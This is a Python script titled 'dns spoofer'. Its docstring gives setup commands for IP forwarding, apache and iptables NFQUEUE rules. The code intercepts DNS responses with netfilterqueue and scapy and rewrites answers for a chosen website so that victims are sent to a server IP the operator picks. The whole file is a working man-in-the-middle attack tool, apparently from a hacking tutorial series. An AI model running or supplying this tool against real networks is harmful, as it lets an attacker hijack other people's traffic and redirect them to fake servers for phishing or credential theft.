#!/usr/bin/env python
"""
    works in python 2 or 3
    set up your enviroment

    configure computer as router
        echo 1 > /proc/sys/net/ipv4/ip_forward
    start server
        service apache2 start
    set up firewall rules using
        local
            iptables -I OUTPUT -j NFQUEUE --queue-num 0
            iptables -I INPUT -j NFQUEUE --queue-num 0
        remote
            iptables -I FORWARD -j NFQUEUE --queue-num 0
    delete tables
        iptables --flush

    Program Name: dns spoofer

    Description: Changes the dns server to respond with your server instead of orginally requsted server


    Options:
        -w or --website = website url
        -s or --server = server ip
        --help = argument options


    Examples:
        python dns_spoofer.py -w or --website with -s or --server
        python dns_spoofer.py --help

    Requirements:
        Runs on Python 2 or 3

    Author: CoderMANE

    Date: 2024-06-15
"""
import netfilterqueue
import scapy.all as scapy
import optparse

# survey and create DNS responses
# collects arguments


def get_arguments():
    # parse user inputs
    parser = optparse.OptionParser()
    # describes options
    parser.add_option("-w", "--website", dest="website", help="Desired website to spoof")
    parser.add_option("-s", "--server", dest="server", help="Desired server you want visited")
    (options, arguments) = parser.parse_args()
    if not options.website:
        parser.error("[-] Please specify an url, use --help for more info.")
    elif not options.server:
        parser.error("[-] Please specify an server ip, use --help for more info.")
    return options


options = get_arguments()


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        # grab domain name
        qname = scapy_packet[scapy.DNSQR].qname
        if options.website in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.server)
            # create response
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # delete response check(checksum and length of packet)
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
# bind queue of responses to your ip table
queue.bind(0, process_packet)
# use call back and table
queue.run()
